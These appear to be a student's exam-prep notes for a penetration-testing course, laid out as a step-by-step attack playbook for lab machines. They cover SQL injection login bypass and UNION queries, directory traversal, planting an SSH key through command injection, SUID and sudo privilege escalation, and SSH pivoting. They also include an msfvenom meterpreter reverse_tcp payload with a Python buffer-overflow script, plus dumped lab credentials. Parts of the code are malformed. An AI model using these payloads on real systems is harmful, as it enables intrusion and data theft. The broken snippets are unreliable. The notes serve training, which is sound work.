####################################################################################################################################################################################################

                                                                                         #DRY RUN#

####################################################################################################################################################################################################
#How to Elevate from shell to BASH
    /bin/bash
    
#Will be given first IP
    namp -v -sT -Pn <ip addr> -p-
    
#If 80 open go to ip addr in web browser to see if able to exploit
    #Test different SQL injection or web exploits possible
        tom' OR 1='1
            #if works do version in the web bar
                http://10.50.27.243/login.php?username=tom' OR 1='1&passwd=tom' OR 1='1
        SSH key upload, etc
            #SSH Key Upload
            #Through either malicious upload or command injection, we can potentially upload our ssh key onto the target system
                #with that we can gain access without the need of a password
            #Run the ssh key gen command on ops-station. When prompted for location to save just press enter to leave default, you can press enter for password as well
                ssh-keygen -t rsa
            #After generating ssh key look for public key in your .ssh folder. Your public key will have .pub as the extension
                cat ~/.ssh/id_rsa.pub
            #On the target website we need to do some tasks in order to upload our ssh properly
                #These commands can be ran from a place where command injection is possible or if you uploaded some malicious php they can be done from there
                whoami
                    #Once the user is known find this users home folder by looking in /etc/passwd
                    ; cat /etc/passwd
                    #We also want to make sure the user has a login shell
                www-data:x:33:33:www-data:/var/www:/bin/bash
                #Check to see if .ssh folder is in the users home directory. If not make it
                    ls -la /users/home/directory      #check if .ssh exists
                        ls -la /var/www:
                    mkdir /users/home/directory/.ssh  #make .ssh in users home folder if it does not exist
                        mkdir /var/www:/.ssh
                #Echo ssh key to the authorized_keys file in the users .ssh folder
                    echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys
                        echo "the shit" >> /var/www:/.ssh/authorized_keys
                #Verify key has been uploaded successfully
                    cat /users/home/directory/.ssh/authorized_keys
                      cat /var/www:/.ssh/authorized_keys
        
        #if php with option can input /../../../../../../../../../../../../../../../../../../../../etc/passwd
            #after equals sign to view /etc/passwd
            #/etc/hosts
                #CHECK THIS TO SEE IF ANY INFO ON OTHER IPS
        #CHECK <ip>/scripts

Array of unames and passwds from http server of .243
Array ( [0] => user2 [name] => user2 [1] => RntyrfVfNER78 [pass] => RntyrfVfNER78 ) 1Array ( [0] => user3 [name] => user3 [1] => Obo4GURRnccyrf [pass] => Obo4GURRnccyrf )
1Array ( [0] => Lee_Roth [name] => Lee_Roth [1] => anotherpassword4THEages [pass] => anotherpassword4THEages ) 1



##################################################################################################################################################################################################

                                                                                        #SSGT Review#

#####################################################################################################################################################################################################
                                                              #(Idea can type out in op notes to have for later)
                                             #YOU NEED TO TAKE OPNOTES FOR THE TEST TO RECIEVE CREDIT (CAN BE MAP, OR DOC, NEED TO DO)
                                                                          #NEED 116.5 POINTS TO PASS
                                                                    #SAVE LONG PARTS/QUESTIONS FOR THE END
                                                        #No need to go back to a box once completed all questions for it
#First Step is open up some sort of notes 
    #record given ip
#Port Discovery
    nmap -Pn -sT -T4 <given ip> -p 80,22,2222,4444,4242,9999,3389
        #use these ports caue weve seen them before in the course
        #this is first step for initial port discovery
    #Record results of scan
    #banner grab to confirm what ports are
        nc <ip> <port>
            #can feed GET / or anything to check for http
#Now we don't have creds so we can't attack ssh, so choose something we can (this case HTTP)
#Web Recon
    nikto -h <ip>           #-h for hosts is a website scanner
        #record directories that seem usable from results of nikto
    
    nmap -Pn -sT -T4 <ip> -p 80 --script http-enum.nse
        #same deal as nikto, but another way to do
        #RUN BOTH TO HAVE THE DOUBLE CHECK IN CASE ONE MISSED SOMETHING
    #Take those directories and check them out in url
        #record information of intrest when found
    #if found creds test them via the ssh to see if work
    
    #Alt way to get creds from login page of site                        ONLY THING YOU CAN GET FROM LOGIN PAGE IS USERNAME AND PASSWORD
        tom' OR 1='1
            #enter for both user and password to see if work
            #if post way works but not return anything good do get method
                #press f12 before submitting or'1='1
                    #go to network tab
                #press login
                #click on POST request
                    #in window on right click request
                    #on request page click raw in top right
                        #copy everything there and put in url bar
                            #add ? after php anmd paste what we took from the POST request
               #Decode passwords on that page
                  #ONLY TWO POSSIBLE ENCODINGS WE WILL COME ACROSS IS ROT13 OR BASE64
                      #cyberchef magic will not work use one of those
                      
  #Files to read
      #first step in bar put
          ; whoami
              #check for command injection
      #if command injection doesnt work do directory traversal
          ../../../../../../../../../../../../../../../../.././../../../../etc/passwd
              #check this with the usernames from GET method and find what one is actually a user on this decive
              
#Malicious File upload
    #Need two things
        #be able to upload a file
        #need to be able to find the upload
    #if you cannot upload the web shell move on it work work
        #if there is no uploads page who the fuck cares

#Once we have creds log into device
    #first thing when on the box
        /bin/bash
            #for when we don't have a bash shell to get into it
    #FIRST COMMAND EVERYTIME
        whoami
        hostname
    #next step is attempt to ascalate
        sudo -l         #first step cause its easy
        #if that don't work
            find / -type f -perm /4000 2>/dev/null      
                #check each one of the executables in GTFO bins
                #4000 is for SUID, repeat steps with 2000, and then if none else works do 6000
                      #if no results from any move on its not a viable exploit here
            #if that doesn't work do buffer overflow
                which gdb
                    #if the box has gdb then you WILL be doing buffer overflows at some point
                    #IT IS POSSIBLE FOR A BOX TO NOT HAVE PRIV ESCALATION ON IT

#Now that we have enumerated and tried to escalate time to find next device to work on
    ip n
      #not reliable on a web based network like what we work on
    cat /etc/hosts
        #can find ips and use them to scan for more
    #best way to find more ips to work is a PING SWEEP
        for i in {1..254}; do (ping -c1 192.168.1.$i | grep "bytes from" &); done
            #change ip for what we need obv
            #do ping sweep from closest device that we are working to
            #LOOK AT DON'T TOUCH BOARD FOR OFF LIMITS IPS
                #any with ttl of 64 and like no latency is a router
        

#Tunnel shits
    ssh <user>@<first ip> -D 9050
        #dynamic to the ip given from beginning
        #now do port identification and enumeration on new devices found
            proxychains nmap -Pn -sT -T4 <given ip> -p 80,22,2222,4444,4242,9999,3389
            nc <ip> <port>
        #as soon as dynamic tunnel is done being used CLOSE IT
            #don't get caught forgetting one and then you can't set up another
    ssh <user>@<first ip> -L 8008:<one of ips discovered>:80
        #this is based off of having port 80 open assuming its HTTP
            #in this case was 22 and 80 open on both ips we found
                #is shh and HTTP
            #can try creds we have on port 22 first if you want, but no harm going port 80 first
                #8 WAYS TOSKIN A CAT

#SQL INJECTIONS(NEED THIS SHIT TO PASS)
    #hints you will need sql injections are things like radio buttons (the options things)
    #when you submit an option it will have a table
        #only thing we have here to do is sql injections with golden statement
            #login page can only get usernames and passwords, this can get more
    #SSGT way
        #SQL INJECTION
        0. identify SQL Database (NOT LOGIN)
        1. identify method for SQL Database Variables
            1.1 Integers? Strings? Variable Names? GET? POST?
        2. Identiy vulnerable field
            2.1 YOU WILL TRY EVERY FIELD
                2.1.1 OR 1=1 ;#
                2.1.2 put that after number for each option until we get table dump (will dump everything)
                2.1.3 put url in notes to have for later
        3. Identify number of columns <- Skip and Parish
            3.1 UNION SELECT 1,2,3
                3.1.1 start with number of columns you can see
                3.1.2 add , nect number until not an error, if go past 9 we've gone too far
            3.2 Verify placement of columns
                3.2.1 make sure it displays the same and if not note how it is displayed
                3.2.2 if display with estra tuff know to ignore, ex putting a $ in front of data, etc
        4. Golden statement
            4.1 UNION select table_schema,table_name,column_name from information_schema.columns;
                4.1.1 put on end of url we saved with vulnerable field
                4.1.2 it displays in this case in 1,3,2
                    4.1.2.1 in this case order golden as table_schema,column_name,table_name
            4.2 Ensure goldent statement lines up with step 3 (padding, formatting)
        5. Use Goldent Statement to create custom queries
        6. ????
        7. Profit, pass the exam, leave cosc forever
            
        #Take the golden statement full url and build the next sql injection from its format
            #on bottom of page is typically where user made table data will be
            #shit like username, names, userid, etc
                #may be questions on ctf for test that need to get data from SQL injections this way
        #IF IT SOMEHOW TURNS SIDEWAYS
            #have recorded the order in which the output is displayed to stay organizzed and not get got
#If found some new creds try them out on our new boxes
    #IT IS OKAY TO NOT GET ONTO A MACHINE
        #Some machines may be not accessable and if get all questions without accessing move on

#Once finished enumerating, injecting, and trying to access move to next device
#Try our new creds on this new box just for shits and giggles to see if they work

#ssh onto new box with creds that work
    whoami
    hostname
    #IF NOT IN BASH RUN
        /bin/bash
    #try to escalate
        sudo -l             #in this case we found that we can use /usr/bin/find to escalate
            #put find into GTFO
                #has a sudo option, which is how we found it so do that way
                    #put into notes, then run
                        #make sure that all paths to commands work
                            #IF THERE IS A ./ IN A GTFO COMMAND GET THE FUCK RID OF IT
                    #change shell to bash cause shell sucks
                    #copy, paste
                        whoami
        #if no sudo see above for next steps to try and escalate
        
    #now from the device we can get on
    #host discovery
        cat /etc/hosts
        ip n
        
        if nothing from there just run ping sweep (see above for) on the same ip addr we are on (or try ip a for possible netowrks)
            #use context clues to guess what os it is
    #port discovery (139 and 445 will be exactly what we think no need to banner grab them)
    #port enumerations (see above for tursted ports)
    
    #tunnel
    ssh <user>@<first> -L 8080:<new ip>:22
    ssh <user for new>@localhost -p <high from tunnel> -D 9050
        proxchains nmap, nc etc to enumerate ports for new device we found
        #when done close out dynamic tunnel
    ssh Aaron@localhost -p 8080 -L 7777:<ip of win device past 2nd>:9999
        #in this case 9999 is secure server
    #DO THE WIN_BUFF.py deal for windows to get on with reverse_tcp
    #generate shell code
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=7777 -b '\x00' -f python
                                                      #put ip of whatever is running multihandler
                                                                    #just a port that aint 4444 (make sure matches in this and script
        #do from msfconsole
          msfconsole
          use multi/handler
          show options
          set payload windows/meterpreter/reverse_tcp
          set LHOST <IP of Box running this from> 
              #if doing from a tunnel use 0.0.0.0
          exploit

#SCRIPT TO DO A REVERSE TCP FOR A WIN_BUF IF NEEDED FOR TEST
import socket #required input

buf = "TRUN /.:/"
buf += "A" * 2003 #offset
buf += "\xa0\x12\x50\x62" #EIP from secure Server
buf += '\90' *20 #NO OP sled for safety

#### Shell Code #####
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=7777 -b '\x00' -f python

#put shell code here

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #create the Ipv4 socket, TCP protocol
s.connect(("<ip from getting shell>", <ip from above>))   #Connect to target ip and port
print s.recv(1024)                  #Prints Response
s.send(buf)                         #Send the value of buf
print s.recv(1024)                  #Print Response
s.close()                           #closes the socket


#Other ways to exploit windows



